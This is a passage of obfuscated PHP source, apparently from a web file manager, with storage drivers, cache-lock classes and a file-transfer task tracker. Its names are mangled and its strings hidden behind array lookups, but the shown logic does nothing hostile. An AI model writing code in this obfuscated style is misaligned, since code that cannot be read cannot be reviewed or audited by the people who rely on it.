strtolower($§’¦â±‹->getType())); if ($ù‚»²í == $ÎúØ¶şù[109]) { return array($ÎúØ¶şù[33] => $ÎúØ¶şù[109], $ÎúØ¶şù[1377] => $ÎúØ¶şù[12], $ÎúØ¶şù[87] => $ÊúÎï‰€, $ÎúØ¶şù[98] => $§’¦â±‹); } return array($ÎúØ¶şù[33] => $ÎúØ¶şù[917], $ÎúØ¶şù[1377] => $§’¦â±‹->pathDriver, $ÎúØ¶şù[87] => $ÊúÎï‰€, $ÎúØ¶şù[98] => $§’¦â±‹); } public static function pathDriverType($Ò³Ö£Â¾) { return $Ò³Ö£Â¾ ? self::driverType(IO::init($Ò³Ö£Â¾)) : !1; } public static function pathDriverLocal($¡ µ×Ú) { $Òã“º¿Ÿ =& $_SERVER[ìïæ“œî]; $õÁÃıËî = $¡ µ×Ú ? self::driverType(IO::init($¡ µ×Ú)) : !1; return $õÁÃıËî[$Òã“º¿Ÿ[33]] == $Òã“º¿Ÿ[109] ? !0 : !1; } public static function allowCover($Í£¡µè , $ÒóÓØ·© = true) { $Ò·š„áˆ =& $_SERVER[ìïæ“œî]; if (is_string($Í£¡µè )) { $Í£¡µè  = IO::info($Í£¡µè ); } if (!$Í£¡µè  || $Í£¡µè [$Ò·š„áˆ[33]] == $Ò·š„áˆ[78] || $Í£¡µè [$Ò·š„áˆ[79]] <= 100) { return !1; } if (isset($Í£¡µè [$Ò·š„áˆ[1384]]) || !$Í£¡µè [$Ò·š„áˆ[87]]) { return !1; } if (isset($Í£¡µè [$Ò·š„áˆ[232]]) && !$Í£¡µè [$Ò·š„áˆ[232]]) { return !1; } static $áÑÃå€ë = false; if (!$áÑÃå€ë || !$ÒóÓØ·©) { $³Ûå©áß = self::driverType(IO::init($Í£¡µè [$Ò·š„áˆ[87]])); $ã‹˜‡© = $³Ûå©áß[$Ò·š„áˆ[98]]; $áÑÃå€ë = $Ò·š„áˆ[196]; if ($³Ûå©áß[$Ò·š„áˆ[33]] == $Ò·š„áˆ[109]) { $áÑÃå€ë = $Ò·š„áˆ[1385]; } if ($³Ûå©áß[$Ò·š„áˆ[98]] && is_array($³Ûå©áß[$Ò·š„áˆ[98]]->config)) { $ª³­²ìù = $³Ûå©áß[$Ò·š„áˆ[98]]->config; if (isset($ª³­²ìù[$Ò·š„áˆ[1386]]) && $ª³­²ìù[$Ò·š„áˆ[1386]]) { $áÑÃå€ë = $Ò·š„áˆ[1385]; } } } return $áÑÃå€ë == $Ò·š„áˆ[1385] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ÓîêšõÃ) { parent::__construct($ÓîêšõÃ); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function fileOutLink($¦êİõ¥ˆ) { $éê™²·ö =& $_SERVER[ìïæ“œî]; if (substr($¦êİõ¥ˆ, 0, 7) == $éê™²·ö[313]) { $¦êİõ¥ˆ = $éê™²·ö[314] . substr($¦êİõ¥ˆ, 7); } header($éê™²·ö[175] . $¦êİõ¥ˆ); die; } } goto C‡‘¿ÅÅÛ¿; bÙ©Ö­²ã÷: class CacheLockRedis { public function lock($–å²³Ü, $´ˆĞ½¯› = 10) { $ë»¶ˆ‡¥ = Cache::init(); $—ê£şÊ = microtime(!0) + $´ˆĞ½¯›; while (microtime(!0) < $—ê£şÊ) { $¹‹î ˜ç = $ë»¶ˆ‡¥->get($–å²³Ü); if (!$¹‹î ˜ç) { $Àªùâ©È = $ë»¶ˆ‡¥->setLock($–å²³Ü, $—ê£şÊ, $´ˆĞ½¯›); if ($Àªùâ©È) { return !0; } } else { if ($¹‹î ˜ç < microtime(!0)) { $ë»¶ˆ‡¥->set($–å²³Ü, $—ê£şÊ, $´ˆĞ½¯› * 2); if ($ë»¶ˆ‡¥->get($–å²³Ü) === $¹‹î ˜ç) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($­íŒÌ –) { return Cache::init()->get($­íŒÌ –); } public function unlock($ÀÔ™ÌØÂ) { return Cache::init()->remove($ÀÔ™ÌØÂ); } } class CacheLockMemcached { public function lock($¼š†”Ñ, $›Ëˆâ™œ = 0) { $ëµ˜š³¡ = Cache::init(); $°©ò§¢â = microtime(!0) + $›Ëˆâ™œ; while (microtime(!0) < $°©ò§¢â) { $Ş´§ËÃ = $ëµ˜š³¡->get($¼š†”Ñ); if (!$Ş´§ËÃ || $Ş´§ËÃ < microtime(!0)) { $ôôÌË€ = $ëµ˜š³¡->handle->add($¼š†”Ñ, $°©ò§¢â, $›Ëˆâ™œ); if ($ôôÌË€) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¢½İ‡) { return Cache::init()->get($¢½İ‡); } public function unlock($–™ßÃ¯¡) { return Cache::init()->remove($–™ßÃ¯¡); } } class CacheLockDatabase { public function lock($‹ğÎğÛ°, $…‘¨ü‚ = 0) { $Ö””ªÒ² = Model($_SERVER[ìïæ“œî][877]); $î€ŒœĞó = microtime(!0) + $…‘¨ü‚; while (microtime(!0) < $î€ŒœĞó) { $’¤¡µ = $Ö””ªÒ²->get($‹ğÎğÛ°); if (!$’¤¡µ || $’¤¡µ < microtime(!0)) { $¯Ÿû·Å¸ = $Ö””ªÒ²->set($‹ğÎğÛ°, $î€ŒœĞó); if ($¯Ÿû·Å¸) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ÓÏàşö) { return Model($_SERVER[ìïæ“œî][877])->get($ÓÏàşö); } public function unlock($’ë±Õ°) { Model($_SERVER[ìïæ“œî][877])->remove($’ë±Õ°); } } goto EèÏÜ©¬ÏÒ; d‹öˆÊ—âµ: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\165\x6e\x6e\151\x6e\x67"; const STATYS_KILL = "\x6b\x69\154\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ûï°¹‡è, $Í¢üâú = '', $ìßÛ‰ = 0, $ˆ¤ˆ·ù = '') { $¿åóë×â =& $_SERVER[ìïæ“œî]; if (self::get($ûï°¹‡è)) { return; } $this->task = array($¿åóë×â[475] => $ûï°¹‡è, $¿åóë×â[1747] => USER_ID, $¿åóë×â[1636] => $ˆ¤ˆ·ù, $¿åóë×â[526] => $¿åóë×â[12], $¿åóë×â[33] => $Í¢üâú, $¿åóë×â[1120] => $¿åóë×â[12], $¿åóë×â[1118] => $ìßÛ‰, $¿åóë×â[1748] => 0, $¿åóë×â[1749] => 0, $¿åóë×â[1750] => 0, $¿åóë×â[1751] => timeFloat(), $¿åóë×â[1752] => 0, $¿åóë×â[1753] => 0, $¿åóë×â[1754] => 0, $¿åóë×â[1755] => 0, $¿åóë×â[799] => $¿åóë×â[1697]); $GLOBALS[$¿åóë×â[1756]] = 1; Hook::bind($¿åóë×â[1701], array($this, $¿åóë×â[1757])); Hook::bind($¿åóë×â[1758], array($this, $¿åóë×â[1759])); $this->startAfter(); Hook::trigger($¿åóë×â[1760], $this->task); $this->task[$¿åóë×â[1753]] = timeFloat(); } public function end($ñÍÜÎÙ” = '') { $ıì˜’È× =& $_SERVER[ìïæ“œî]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ıì˜’È×[1753]]) { self::valueSet($this->task[$ıì˜’È×[475]], !1); } $this->isEnd = !0; if ($ñÍÜÎÙ”) { $this->task[$ıì˜’È×[526]] = $ñÍÜÎÙ”; } self::log($ıì˜’È×[1761] . $this->task[$ıì˜’È×[475]] . $ıì˜’È×[1762] . sprintf($ıì˜’È×[899], timeFloat() - $this->task[$ıì˜’È×[1751]]) . $ıì˜’È×[1763]); Hook::unbind($ıì˜’È×[1701], array($this, $ıì˜’È×[1757])); Hook::unbind($ıì˜’È×[1758], array($this, $ıì˜’È×[1759])); $this->endAfter(); $¸ü¹Ô¨® = $this->task; $this->task = !1; Hook::trigger($ıì˜’È×[1764], $¸ü¹Ô¨®); } public function update($ªÅŒá• = 0, $ÛıüŸñÀ = false) { $—Ã¶ç¬¸ =& $_SERVER[ìïæ“œî]; $¦ÕÄ‡÷ú =& $this->task; if (!$¦ÕÄ‡÷ú) { return; } $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1748]] += $ªÅŒá•; $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1752]] = timeFloat(); if ($¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1118]]) { if ($¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1118]] < $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1748]]) { $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1118]] = $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1748]]; } $Äà›Æ”µ = timeFloat() - $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1751]] - $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1754]]; if ($Äà›Æ”µ <= 0) { $Äà›Æ”µ = 0.001; } $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1749]] = $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1748]] / $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1118]]; $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1750]] = $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1748]] / $Äà›Æ”µ; if ($¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1749]] > 0) { $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1755]] = $Äà›Æ”µ * (1 - $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1749]]) / $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1749]]; } $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1755]] = $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1755]] <= 0 ? 0 : $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1755]]; } $this->updateAfter(); $í²äĞÀš = 0.2; if (timeFloat() - $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1753]] < $í²äĞÀš && !$ÛıüŸñÀ) { return; } $ø”Å®÷§ = self::get($¦ÕÄ‡÷ú[$—Ã¶ç¬¸[475]]); $‹ªÄÔİ¦ = $ø”Å®÷§[$—Ã¶ç¬¸[799]]; if ($‹ªÄÔİ¦ == self::STATYS_KILL) { $ÀøòÒŒœ = array($—Ã¶ç¬¸[1765] => LNG($—Ã¶ç¬¸[1766]), $—Ã¶ç¬¸[1274] => !1); Cache::set($—Ã¶ç¬¸[1767] . $this->task[$—Ã¶ç¬¸[475]], $ÀøòÒŒœ, 30); $this->onKill(); $this->end(); die; } else { if ($‹ªÄÔİ¦ == self::STATYS_STOP) { $ªñ£Èø· = 2; $ø”Å®÷§[$—Ã¶ç¬¸[1754]] += $ªñ£Èø·; self::valueSet($¦ÕÄ‡÷ú[$—Ã¶ç¬¸[475]], $ø”Å®÷§); sleep($ªñ£Èø·); $this->update(); return; } } $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[799]] = $‹ªÄÔİ¦ ? $‹ªÄÔİ¦ : $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[799]]; $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1754]] = $ø”Å®÷§[$—Ã¶ç¬¸[1754]] ? $ø”Å®÷§[$—Ã¶ç¬¸[1754]] : 0; $¦ÕÄ‡÷ú[$—Ã¶ç¬¸[1753]] = timeFloat(); Hook::trigger($—Ã¶ç¬¸[1768], $¦ÕÄ‡÷ú); self::valueSet($¦ÕÄ‡÷ú[$—Ã¶ç¬¸[475]], $¦ÕÄ‡÷ú); } public function onKillSet($â ùäíÒ, $«óş‚»è = array()) { $this->onKillCall = array($â ùäíÒ, $«óş‚»è); } public function onKill() { $ÄşøÍ´¿ =& $_SERVER[ìïæ“œî]; self::log($ÄşøÍ´¿[1761] . $this->task[$ÄşøÍ´¿[475]] . $ÄşøÍ´¿[1769]); Hook::trigger($ÄşøÍ´¿[1770], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¡Ì‹Ñô) { $èˆª–Ç— =& $_SERVER[ìïæ“œî]; Cache::set($èˆª–Ç—[1767] . $this->task[$èˆª–Ç—[475]], $¡Ì‹Ñô, 60); return $¡Ì‹Ñô; } public static function get($¼õÎËÏı) { $¯¶†ÖêÍ =& $_SERVER[ìïæ“œî]; $ŸãÃÊĞ¾ = self::valueGet($¼õÎËÏı); if (is_array($ŸãÃÊĞ¾) && $ŸãÃÊĞ¾[$¯¶†ÖêÍ[1771]]) { $°Äå¡äÁ = ActionApply($ŸãÃÊĞ¾[$¯¶†ÖêÍ[1771]], array($ŸãÃÊĞ¾)); $ŸãÃÊĞ¾ = is_array($°Äå¡äÁ) ? $°Äå¡äÁ : $ŸãÃÊĞ¾; } return $ŸãÃÊĞ¾; } public static function listData() { $’ëòÆå„ = self::valueGet(); return array_sort_by($’ëòÆå„, $_SERVER[ìïæ“œî][1751], !0); } public static function kill($ç¸ã´Œõ) { return self::changeStatus($ç¸ã´Œõ, self::STATYS_KILL); } public static function stop($Îˆ¡ı¢È) { return self::changeStatus($Îˆ¡ı¢È, self::STATYS_STOP); } public static function restart($Â²§œü”) { return self::changeStatus($Â²§œü”, self::STATYS_RUNNING); } public static function killAll() { $¥§½ßÖ =& $_SERVER[ìïæ“œî]; $Õ‚¡‡—ê = self::listData(); foreach ($Õ‚¡‡—ê as $·øïÌÏÎ) { self::kill($·øïÌÏÎ[$¥§½ßÖ[475]]); } sleep(2); foreach ($Õ‚¡‡—ê as $·øïÌÏÎ) { self::valueSet($·øïÌÏÎ[$¥§½ßÖ[475]], !1); } } private static function changeStatus($¿ÉƒŞ›•, $ÜşÙ¤Šø) { $®·‹º€ =& $_SERVER[ìïæ“œî]; $ß®…Òé‹ = self::valueGet($¿ÉƒŞ›•); if (!$ß®…Òé‹) { return !1; } $ß®…Òé‹[$®·‹º€[799]] = $ÜşÙ¤Šø; self::valueSet($¿ÉƒŞ›•, $ß®…Òé‹); self::log($®·‹º€[1772] . $ß®…Òé‹[$®·‹º€[475]] . $®·‹º€[1773] . $ÜşÙ¤Šø); return !0; } public static function valueGet($¥ÅúìŒ = false) { $ì¸Õ’ßš =& $_SERVER[ìïæ“œî]; if ($¥ÅúìŒ) { $ĞÑüÕ‡Á = Model($ì¸Õ’ßš[520])->where(array($ì¸Õ’ßš[97] => $¥ÅúìŒ, $ì¸Õ’ßš[33] => $ì¸Õ’ßš[1127]))->find(); return $ĞÑüÕ‡Á ? json_decode($ĞÑüÕ‡Á[$ì¸Õ’ßš[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Œìğâ¦ = false) { $é‘Òå«è =& $_SERVER[ìïæ“œî]; $Şİæ×ùÃ = array($é‘Òå«è[33] => $é‘Òå«è[1127]); if ($Œìğâ¦) { $Şİæ×ùÃ[$é‘Òå«è[1747]] = $Œìğâ¦; } $èĞß¿ª¨ = Model($é‘Òå«è[520])->where($Şİæ×ùÃ)->select(); $èĞß¿ª¨ = $èĞß¿ª¨ ? $èĞß¿ª¨ : array(); foreach ($èĞß¿ª¨ as $£Ü¼ºò => $“İæÌ) { $èĞß¿ª¨[$£Ü¼ºò] = json_decode($“İæÌ[$é‘Òå«è[450]], !0); } return $èĞß¿ª¨; } public static function valueSet($Ğˆ«ì‰ù, $ƒšÀÔõ¥) { $Œ¾Á˜æ =& $_SERVER[ìïæ“œî]; if (!$ƒšÀÔõ¥) { return Model($Œ¾Á˜æ[520])->where(array($Œ¾Á˜æ[97] => $Ğˆ«ì‰ù, $Œ¾Á˜æ[33] => $Œ¾Á˜æ[1127]))->delete(); } $á“ßü¢È = json_encode($ƒšÀÔõ¥); if (!$á“ßü¢È) { ob_start(); var_dump($ƒšÀÔõ¥); $†ãÓ„Ò = ob_get_clean(); self::log($Œ¾Á˜æ[1774] . json_encode_force($†ãÓ„Ò)); } if (!$Ğˆ«ì‰ù || !$ƒšÀÔõ¥[$Œ¾Á˜æ[475]]) { return !1; } $…©ı˜„à = array($Œ¾Á˜æ[33] => $Œ¾Á˜æ[1127], $Œ¾Á˜æ[1747] => USER_ID, $Œ¾Á˜æ[97] => $Ğˆ«ì‰ù, $Œ¾Á˜æ[450] => $á“ßü¢È); $ñƒ‘ÄÒ• = $Œ¾Á˜æ[1775]; CacheLock::lock($ñƒ‘ÄÒ•); Model($Œ¾Á˜æ[520])->add($…©ı˜„à, array(), !0); CacheLock::unlock($ñƒ‘ÄÒ•); } public static function log($œ¬àÑ‰Õ) { if (!GLOBAL_DEBUG) { return; } write_log($œ¬àÑ‰Õ, $_SERVER[ìïæ“œî][1776]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ï¦Á¤Ùé =& $_SERVER[ìïæ“œî]; $¿àƒ¡òÑ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ï¦Á¤Ùé[1777], array($this, $Ï¦Á¤Ùé[1778])); Hook::bind($Ï¦Á¤Ùé[1285], array($this, $Ï¦Á¤Ùé[1779])); Hook::bind($Ï¦Á¤Ùé[1780], array($this, $Ï¦Á¤Ùé[1781])); Hook::bind($Ï¦Á¤Ùé[668], array($this, $Ï¦Á¤Ùé[1782])); Hook::bind($Ï¦Á¤Ùé[669], array($this, $Ï¦Á¤Ùé[1783])); Hook::bind($Ï¦Á¤Ùé[675], array($this, $Ï¦Á¤Ùé[1784])); Hook::bind($Ï¦Á¤Ùé[676], array($this, $Ï¦Á¤Ùé[1785])); Hook::bind($Ï¦Á¤Ùé[671], array($this, $Ï¦Á¤Ùé[1786])); Hook::bind($Ï¦Á¤Ùé[673], array($this, $Ï¦Á¤Ùé[1787])); Hook::bind($Ï¦Á¤Ùé[637], array($this, $Ï¦Á¤Ùé[1788])); Hook::bind($Ï¦Á¤Ùé[634], array($this, $Ï¦Á¤Ùé[1788])); Hook::bind($Ï¦Á¤Ùé[639], array($this, $Ï¦Á¤Ùé[1788])); Hook::bind($Ï¦Á¤Ùé[641], array($this, $Ï¦Á¤Ùé[1788])); Hook::bind($Ï¦Á¤Ùé[643], array($this, $Ï¦Á¤Ùé[1788])); Hook::bind($Ï¦Á¤Ùé[1789], array($this, $Ï¦Á¤Ùé[1790])); Hook::bind($Ï¦Á¤Ùé[659], array($this, $Ï¦Á¤Ùé[1791])); $this->sourceModelCopyFlag = !1; Hook::bind($Ï¦Á¤Ùé[1792], array($this, $Ï¦Á¤Ùé[1793])); Hook::bind($Ï¦Á¤Ùé[1794], array($this, $Ï¦Á¤Ùé[1795])); Hook::bind($Ï¦Á¤Ùé[1796], array($this, $Ï¦Á¤Ùé[1797])); $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1798]] = LNG($Ï¦Á¤Ùé[1799]); $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1800]] = 0; $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1801]] = 0; $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1120]] = $Ï¦Á¤Ùé[12]; $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1802]] = $Ï¦Á¤Ùé[12]; $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1803]] = 0; $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1804]] = 0; $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1805]] = 0; if (!$¿àƒ¡òÑ[$Ï¦Á¤Ùé[1636]]) { $¿àƒ¡òÑ[$Ï¦Á¤Ùé[1636]] = LNG($Ï¦Á¤Ùé[1806]); } } protected function endAfter() { $ıÇ•Óµç =& $_SERVER[ìïæ“œî]; Hook::unbind($ıÇ•Óµç[1777], array($this, $ıÇ•Óµç[1778])); Hook::unbind($ıÇ•Óµç[1285], array($this, $ıÇ•Óµç[1779])); Hook::unbind($ıÇ•Óµç[1780], array($this, $ıÇ•Óµç[1781])); Hook::unbind($ıÇ•Óµç[668], array($this, $ıÇ•Óµç[1782])); Hook::unbind($ıÇ•Óµç[669], array($this, $ıÇ•Óµç[1783])); Hook::unbind($ıÇ•Óµç[675], array($this, $ıÇ•Óµç[1784])); Hook::unbind($ıÇ•Óµç[676], array($this, $ıÇ•Óµç[1785])); Hook::unbind($ıÇ•Óµç[671], array($this, $ıÇ•Óµç[1786])); Hook::unbind($ıÇ•Óµç[673], array($this, $ıÇ•Óµç[1787])); Hook::unbind($ıÇ•Óµç[637], array($this, $ıÇ•Óµç[1788])); Hook::unbind($ıÇ•Óµç[634], array($this, $ıÇ•Óµç[1788])); Hook::unbind($ıÇ•Óµç[639], array($this, $ıÇ•Óµç[1788])); Hook::unbind($ıÇ•Óµç[641], array($this, $ıÇ•Óµç[1788])); Hook::unbind($ıÇ•Óµç[643], array($this, $ıÇ•Óµç[1788])); Hook::unbind($ıÇ•Óµç[1789], array($this, $ıÇ•Óµç[1790])); Hook::unbind($ıÇ•Óµç[659], array($this, $ıÇ•Óµç[1791])); Hook::unbind($ıÇ•Óµç[1792], array($this, $ıÇ•Óµç[1793])); Hook::unbind($ıÇ•Óµç[1794], array($this, $ıÇ•Óµç[1795])); Hook::unbind($ıÇ•Óµç[1796], array($this, $ıÇ•Óµç[1797])); } public function copyMoveStart($õÈòøŸ, $ıºæ®ºÑ, $¹üü¸ğ„, $˜á–¥¹±) { $©â– ã =& $_SERVER[ìïæ“œî]; self::log($©â– ã[1807] . $ıºæ®ºÑ . $©â– ã[73] . $˜á–¥¹±); $æø‰Š²‰ = rtrim(TEMP_FILES, $©â– ã[8]); if (substr($ıºæ®ºÑ, 0, strlen($æø‰Š²‰)) == $æø‰Š²‰) { return; } if (substr($˜á–¥¹±, 0, strlen($æø‰Š²‰)) == $æø‰Š²‰) { return; } $ƒîŒŠˆ  =& $this->task; $ƒîŒŠˆ [$©â– ã[1808]] = KodIO::transferType($õÈòøŸ, $¹üü¸ğ„); $this->update(); } public function updateAfter() { $µÃ²Î§î =& $_SERVER[ìïæ“œî]; $»ã˜¦çû =& $this->task; if (!$»ã˜¦çû[$µÃ²Î§î[812]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($»ã˜¦çû[$µÃ²Î§î[1808]] == $µÃ²Î§î[1378]) { return; } self::updateTask($»ã˜¦çû); } private static function updateTask(&$¥·“£¨™) { $‰‡ª§ÎÀ =& $_SERVER[ìïæ“œî]; if ($¥·“£¨™[$‰‡ª§ÎÀ[1808]] == $‰‡ª§ÎÀ[1256] || $¥·“£¨™[$‰‡ª§ÎÀ[1808]] == $‰‡ª§ÎÀ[110]) { if ($¥·“£¨™[$‰‡ª§ÎÀ[1802]]) { $¥·“£¨™[$‰‡ª§ÎÀ[1805]] = $¥·“£¨™[$‰‡ª§ÎÀ[1804]] + $¥·“£¨™[$‰‡ª§ÎÀ[1801]]; } } else { if ($¥·“£¨™[$‰‡ª§ÎÀ[1808]] == $‰‡ª§ÎÀ[1379]) { if ($¥·“£¨™[$‰‡ª§ÎÀ[1802]] == $‰‡ª§ÎÀ[1256]) { $¥·“£¨™[$‰‡ª§ÎÀ[1805]] = $¥·“£¨™[$‰‡ª§ÎÀ[1804]] + $¥·“£¨™[$‰‡ª§ÎÀ[1801]] * 0.5; } else { if ($¥·“£¨™[$‰‡ª§ÎÀ[1802]] == $‰‡ª§ÎÀ[110]) { $¥·“£¨™[$‰‡ª§ÎÀ[1805]] = $¥·“£¨™[$‰‡ª§ÎÀ[1804]] + $¥·“£¨™[$‰‡ª§ÎÀ[1800]] * 0.5 + $¥·“£¨™[$‰‡ª§ÎÀ[1801]] * 0.5; } } } } $¥·“£¨™[$‰‡ª§ÎÀ[1749]] = $¥·“£¨™[$‰‡ª§ÎÀ[1805]] / $¥·“£¨™[$‰‡ª§ÎÀ[812]]; if ($¥·“£¨™[$‰‡ª§ÎÀ[1749]] > 0) { $ƒÏÂ•ŠŸ = timeFloat() - $¥·“£¨™[$‰‡ª§ÎÀ[1751]] - $¥·“£¨™[$‰‡ª§ÎÀ[1754]]; $¥·“£¨™[$‰‡ª§ÎÀ[1755]] = $ƒÏÂ•ŠŸ * (1 - $¥·“£¨™[$‰‡ª§ÎÀ[1749]]) / $¥·“£¨™[$‰‡ª§ÎÀ[1749]]; } } public function addPath($¡€é§¤Û) { $…Ÿ÷¥ Ã =& $_SERVER[ìïæ“œî]; if (!$¡€é§¤Û) { return; } $Óªî¡ïì =& $this->task; $êÉñ•óÅ = IO::infoWithChildren($¡€é§¤Û); $¦Óæ•ä« = $Óªî¡ïì[$…Ÿ÷¥ Ã[1809]] ? $Óªî¡ïì[$…Ÿ÷¥ Ã[1809]][$…Ÿ÷¥ Ã[1810]] : 0; $Óªî¡ïì[$…Ÿ÷¥ Ã[1809]] = array($…Ÿ÷¥ Ã[1810] => $¦Óæ•ä« + 1, $…Ÿ÷¥ Ã[494] => $êÉñ•óÅ[$…Ÿ÷¥ Ã[32]], $…Ÿ÷¥ Ã[87] => $êÉñ•óÅ[$…Ÿ÷¥ Ã[87]], $…Ÿ÷¥ Ã[582] => $êÉñ•óÅ[$…Ÿ÷¥ Ã[582]] ? $êÉñ•óÅ[$…Ÿ÷¥ Ã[582]] : $êÉñ•óÅ[$…Ÿ÷¥ Ã[87]]); if ($êÉñ•óÅ[$…Ÿ÷¥ Ã[33]] == $…Ÿ÷¥ Ã[230]) { $Óªî¡ïì[$…Ÿ÷¥ Ã[1118]] += 1; } else { $Óªî¡ïì[$…Ÿ÷¥ Ã[1118]] += $êÉñ•óÅ[$…Ÿ÷¥ Ã[82]][$…Ÿ÷¥ Ã[80]]; if ($êÉñ•óÅ[$…Ÿ÷¥ Ã[193]]) { $Óªî¡ïì[$…Ÿ÷¥ Ã[1118]] += $êÉñ•óÅ[$…Ÿ÷¥ Ã[82]][$…Ÿ÷¥ Ã[81]] + 1; } } $Óªî¡ïì[$…Ÿ÷¥ Ã[812]] += $êÉñ•óÅ[$…Ÿ÷¥ Ã[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ƒõ³ıàÁ) { } public function sourceAddHashEnd($ƒŠü”ãı) { } public function sourceAddFileStart($‘ßõÛÌ) { $¨ÄèÃ“Ù =& $_SERVER[ìïæ“œî]; $ÇÃ•ØòÅ =& $this->task; $ÇÃ•ØòÅ[$¨ÄèÃ“Ù[1800]] = $‘ßõÛÌ[$¨ÄèÃ“Ù[79]]; $ÇÃ•ØòÅ[$¨ÄèÃ“Ù[1798]] = $‘ßõÛÌ[$¨ÄèÃ“Ù[32]]; $ÇÃ•ØòÅ[$¨ÄèÃ“Ù[1120]] = $‘ßõÛÌ[$¨ÄèÃ“Ù[32]]; $ÇÃ•ØòÅ[$¨ÄèÃ“Ù[1811]] = $‘ßõÛÌ[$¨ÄèÃ“Ù[87]]; $this->update(); } public function sourceAddFileEnd($‰æïËûå) { $Âôåï€ø =& $_SERVER[ìïæ“œî]; $Œâê¬å¥ =& $this->task; $Œâê¬å¥[$Âôåï€ø[1805]] += $‰æïËûå[$Âôåï€ø[79]]; $Œâê¬å¥[$Âôåï€ø[1811]] = $‰æïËûå[$Âôåï€ø[87]]; $this->update(1); } public function copyFileStart($«ÚŞğáÂ, $ñÏ€€ Í, $ô®˜ÆïÜ, $Íö›½€ã, $‰†•È­í, $ûĞş“ôø) { $ÇªìÙáƒ =& $_SERVER[ìïæ“œî]; $µóÚ˜£ = $‰†•È­í; if ($µóÚ˜£ == $GLOBALS[$ÇªìÙáƒ[1812]]) { $µóÚ˜£ = $GLOBALS[$ÇªìÙáƒ[1813]]; } $GLOBALS[$ÇªìÙáƒ[1813]] = $‰†•È­í; $GLOBALS[$ÇªìÙáƒ[1812]] = $ûĞş“ôø; $å¹¸ü”æ =& $this->task; $å¹¸ü”æ[$ÇªìÙáƒ[1798]] = $µóÚ˜£; $å¹¸ü”æ[$ÇªìÙáƒ[1800]] = (int) $«ÚŞğáÂ->size($ñÏ€€ Í); $å¹¸ü”æ[$ÇªìÙáƒ[1801]] = 0; $å¹¸ü”æ[$ÇªìÙáƒ[1120]] = $ÇªìÙáƒ[12]; $å¹¸ü”æ[$ÇªìÙáƒ[1802]] = $ÇªìÙáƒ[12]; $å¹¸ü”æ[$ÇªìÙáƒ[1803]] = 0; $‹ÌÇ¢Ëè = $å¹¸ü”æ[$ÇªìÙáƒ[1800]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($å¹¸ü”æ[$ÇªìÙáƒ[475]] . $ÇªìÙáƒ[1814]); if ($‹ÌÇ¢Ëè && file_exists(get_path_father($Íö›½€ã))) { Cache::set($å¹¸ü”æ[$ÇªìÙáƒ[475]] . $ÇªìÙáƒ[1814], $Íö›½€ã); $å¹¸ü”æ[$ÇªìÙáƒ[1771]] = array($ÇªìÙáƒ[1815], $ÇªìÙáƒ[1816]); } $this->update(0, $‹ÌÇ¢Ëè); } public static function updateCopyLocalFileSize($îäõßÑô) { $èÃ²¡¼ì =& $_SERVER[ìïæ“œî]; $¡€Äà…· = Cache::get($îäõßÑô[$èÃ²¡¼ì[475]] . $èÃ²¡¼ì[1814]); if (!$¡€Äà…· || !file_exists($¡€Äà…·)) { return $îäõßÑô; } $îäõßÑô[$èÃ²¡¼ì[1801]] = @filesize($¡€Äà…·); $îäõßÑô[$èÃ²¡¼ì[1805]] += $îäõßÑô[$èÃ²¡¼ì[1801]]; self::updateTask($îäõßÑô); return $îäõßÑô; } public function copyFileEnd($Ã¬¦Ï‚â, $½Şøß¢¨, $ììğ‡ü, $Ûø”’Áí, $Œ”Â¦Èë, $ö«„ôõÉ) { $ÆÕ“ã¨ =& $_SERVER[ìïæ“œî]; $¶®½¥²¶ =& $this->task; 